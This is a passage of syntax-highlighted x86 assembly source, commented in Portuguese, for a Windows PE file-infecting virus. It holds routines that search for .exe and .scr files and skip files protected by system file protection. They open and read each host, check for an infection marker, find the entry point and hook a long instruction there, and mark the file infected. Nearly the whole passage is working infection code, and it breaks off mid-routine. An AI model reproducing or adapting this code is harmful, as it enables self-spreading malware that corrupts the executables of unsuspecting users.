</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">busca</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; EBX = Ponteiro para WIN32_FIND_DATA</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MEM_RELEASE</span><span class="sc0">    </span><span class="sc1">; FreeType</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; Size</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">            </span><span class="sc1">; Address</span><span class="sc0">
</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">VirtualFree</span><span class="sc0">     </span><span class="sc1">; Libera memoria...</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">LiberaW32FD</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; --- Sub-função: Manda buscar *.exe,*.scr e *.cpl no diretório...</span><span class="sc0">

</span><span class="sc5">BuscaCDIR</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@msk1</span><span class="sc0">          </span><span class="sc1">; Ponteiro p/ "*.EXE", na stack</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"*.exe"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@msk1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">BuscaEXEC</span><span class="sc0">      </span><span class="sc1">; Manda procurar...</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@msk2</span><span class="sc0">          </span><span class="sc1">; Ponteiro p/ "*.SCR", na stack</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"*.scr"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@msk2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">BuscaEXEC</span><span class="sc0">      </span><span class="sc1">; Manda procurar...</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">BuscaCDIR</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; --- Sub-função: Busca arquivo especificado e manda infectar</span><span class="sc0">
</span><span class="sc1">; Entrada:</span><span class="sc0">
</span><span class="sc1">; Arg1 = Mascara de busca</span><span class="sc0">

</span><span class="sc5">BuscaEXEC</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">busca</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; EAX = Ponteiro para W32_FIND_DATA</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">FindFirstFileA</span><span class="sc0">            </span><span class="sc1">; Procura...</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">; EAX++</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">bexec_fim</span><span class="sc0">                  </span><span class="sc1">; EAX = 0 ? Então vaza...</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">; EAX--</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SH</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; Salva handle!</span><span class="sc0">

</span><span class="sc5">procuramais</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Infecta</span><span class="sc0">                  </span><span class="sc1">; Manda infectar...</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SH</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; EAX = Search handle</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">busca</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; EBX = Ponteiro p/ W32_Find_Data</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">FindNextFileA</span><span class="sc0">             </span><span class="sc1">; Procura proximo...</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">; EAX != 0 ?</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">procuramais</span><span class="sc0">               </span><span class="sc1">; Então procura mais...</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SH</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; EBX = Search handle</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">FindClose</span><span class="sc0">                 </span><span class="sc1">; Termina busca...</span><span class="sc0">

</span><span class="sc5">bexec_fim</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                         </span><span class="sc1">; Retorna...</span><span class="sc0">

</span><span class="sc5">BuscaEXEC</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; --- Sub-função: Infecta executáveis PE</span><span class="sc0">

</span><span class="sc5">Infecta</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">busca</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; EDI = Estrutua W32_FIND_DATA</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">edi.WFD_szFileName</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; ESI = Ponteiro para nome do arquivo</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; EAX = 0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sfc_func</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; ECX = SfcIsFileProtected</span><span class="sc0">
</span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">@pula_chksfc</span><span class="sc0">              </span><span class="sc1">; ECX = 0 ? Então pula essa parte..</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                        </span><span class="sc1">; filename</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">; sfchandle</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                        </span><span class="sc1">; SfcIsFileProtected ?</span><span class="sc0">

</span><span class="sc5">@pula_chksfc</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                      </span><span class="sc1">; EAX != 0 ?</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">infec_fim</span><span class="sc0">                   </span><span class="sc1">; Então vaza...</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">GetFileAttributesA</span><span class="sc0">          </span><span class="sc1">; Pega atributos...</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">; Salva EAX ! (atributos do arquivo)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">                        </span><span class="sc1">; atributos de arquivo normal...</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">SetFileAttributesA</span><span class="sc0">          </span><span class="sc1">; Seta atributos...</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; EAX = 0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; hTemplateFile</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; wFlagsAndAttributes</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">   </span><span class="sc1">; dwCreationDistribution</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; lpSecurityAttributes</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; dwShareMode</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">   </span><span class="sc1">; wDesiredAccess</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">; lpFileName</span><span class="sc0">
</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc0">      </span><span class="sc1">; ...</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; EAX++</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">recupera_attr</span><span class="sc0">     </span><span class="sc1">; EAX=0? Então vaza...</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; EAX--</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FH</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Salva FileHandle !</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; EAX = 0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; ECX = 0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">              </span><span class="sc1">; ECX = 0002000h (8Kb)</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">edi.WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; ECX += Tamanho do arquivo</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">     </span><span class="sc1">; Protect</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MEM_COMMIT_RESERVE</span><span class="sc0"> </span><span class="sc1">; AllocationType</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">; Size</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; Address</span><span class="sc0">
</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">VirtualAlloc</span><span class="sc0">        </span><span class="sc1">; Aloca...</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; EAX = 0 ?</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">fecha_arq</span><span class="sc0">            </span><span class="sc1">; Então vaza...</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Mem</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Salva ponteiro para memória...</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">edi.WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; ECX = Tamanho do arquivo...</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FH</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; EDI = FileHandle</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">; EBX = 0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">; lpOverlapped</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@nobr</span><span class="sc0">              </span><span class="sc1">; lpNumberOfBytesRead</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">@nobr</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">; nNumberOfBytesToRead</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; lpBuffer</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">; hFile</span><span class="sc0">
</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">ReadFile</span><span class="sc0">            </span><span class="sc1">; Lê...</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; EAX = 0 ?</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">libera_mem</span><span class="sc0">           </span><span class="sc1">; Então vaza...</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; EAX = 0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_BEGIN</span><span class="sc0">         </span><span class="sc1">; dwMoveMethod</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; pDistanceToMoveHigh</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; lDistanceToMove</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">; hFile</span><span class="sc0">
</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">SetFilePointer</span><span class="sc0">      </span><span class="sc1">; Move ponteiro...</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Mem</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; EDI = Ponteiro para onde o arquivo está mapeado...</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; ESI = EDI</span><span class="sc0">

</span><span class="sc1">;---- Checagem de imagem ----</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">wod</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc3">"ZM"</span><span class="sc0">      </span><span class="sc1">; Tem assinatura MZ ?</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">libera_mem</span><span class="sc0">          </span><span class="sc1">; Senão vaza...</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">wod</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc3">"EP"</span><span class="sc0">      </span><span class="sc1">; Tem assinatura PE ?</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">libera_mem</span><span class="sc0">          </span><span class="sc1">; Senão vaza..</span><span class="sc0">

</span><span class="sc1">; É dll ? (não pode ser de jeito nenhum)</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.IMAGE_NT_HEADERS.NT_FileHeader.FH_Characteristics</span><span class="sc4">],</span><span class="sc5">IMAGE_FILE_DLL</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">libera_mem</span><span class="sc0">       </span><span class="sc1">; Sim ? Então vaza</span><span class="sc0">

</span><span class="sc1">; Tá infectado ?</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.IMAGE_NT_HEADERS.NT_FileHeader.FH_PointerToSymbolTable</span><span class="sc4">],</span><span class="sc5">marca</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">libera_mem</span><span class="sc0">         </span><span class="sc1">; Sim ? Então vaza..</span><span class="sc0">

</span><span class="sc1">;---- Localização do EntryPoint do programa ----</span><span class="sc0">

</span><span class="sc1">; Vá até o entrypoint</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.IMAGE_NT_HEADERS.NT_OptionalHeader.OH_AddressOfEntryPoint</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; EAX = EP</span><span class="sc0">

</span><span class="sc1">; ECX = número de seções</span><span class="sc0">
</span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">esi.IMAGE_NT_HEADERS.NT_FileHeader.FH_NumberOfSections</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                  </span><span class="sc1">; Até a ultima seção ;)</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0F8h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; EDX = Ponteiro para o cabeçalho de seções</span><span class="sc0">
</span><span class="sc5">scan</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">; Loop que scaneia as seções</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.SH_VirtualAddress</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; VirtualAddress da seção &lt;= EAX ?</span><span class="sc0">
</span><span class="sc6">jle</span><span class="sc0"> </span><span class="sc5">achamos</span><span class="sc0">              </span><span class="sc1">; Então vamos mais a frente...</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">  </span><span class="sc1">; Proxima seção</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">scan</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">libera_mem</span><span class="sc0">               </span><span class="sc1">; Se sair direto eh pq deu pau, então vaza.</span><span class="sc0">

</span><span class="sc5">achamos</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; Salva EAX !</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">edx.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; EAX = EP - VirtualAddress da seção dele</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">edx.SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; ECX = Tamanho da seção</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                          </span><span class="sc1">; ECX-= EAX</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">edx.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; EAX+= VA para o código da seção</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                  </span><span class="sc1">; EAX = Ponteiro para o código da seção</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                              </span><span class="sc1">; Recupera em EDI...</span><span class="sc0">

</span><span class="sc1">;---- Procura de instrução maior do que 4 bytes ----</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                           </span><span class="sc1">; Salva ESI !</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">edx.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; ECX = Tamanho da seção</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">; EDX = Ponteiro para o código da seção</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                        </span><span class="sc1">; ESI = EDX</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                           </span><span class="sc1">; Salva EBP para o caso de um erro...</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                           </span><span class="sc1">; Salva EDX, q é altera qdo se instala SEH</span><span class="sc0">
</span><span class="sc5">pseh</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@handler</span><span class="sc4">&gt;</span><span class="sc0">                </span><span class="sc1">; Poe SEH...</span><span class="sc0">

</span><span class="sc5">@loop_ins</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">; Loop para achar instrução &gt; 4 bytes</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                      </span><span class="sc1">; Usado como isca para a SEH...</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_opsize</span><span class="sc0">                    </span><span class="sc1">; RGBLDE (roy g biv LDE)</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                          </span><span class="sc1">; EAX &gt; 4 ?</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">achamos_ins</span><span class="sc0">                     </span><span class="sc1">; Se sim, então achamos...</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">; ESI+= EAX</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@loop_ins</span><span class="sc0">                     </span><span class="sc1">; Tenta novamente...</span><span class="sc0">

</span><span class="sc5">@handler</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">; EAX = 0</span><span class="sc0">

</span><span class="sc5">achamos_ins</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">rseh</span><span class="sc0">                               </span><span class="sc1">; Tira SEH..</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                            </span><span class="sc1">; Recupera EDX !</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                            </span><span class="sc1">; Recupera EBP !</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                        </span><span class="sc1">; EBX = ESI (Ponteiro para instrução)</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                            </span><span class="sc1">; Recupera ESI !</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">libera_mem</span><span class="sc0">

</span><span class="sc1">;---- Salvamento de dados da infecção atual ----</span><span class="sc0">

</span><span class="sc1">; Marca como infectado</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.IMAGE_NT_HEADERS.NT_FileHeader.FH_PointerToSymbolTable</span><span class="sc4">],</span><span class="sc5">marca</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">host_org</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; EAX = Instrução guardada...</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">; Salva !</span><span class="sc0">
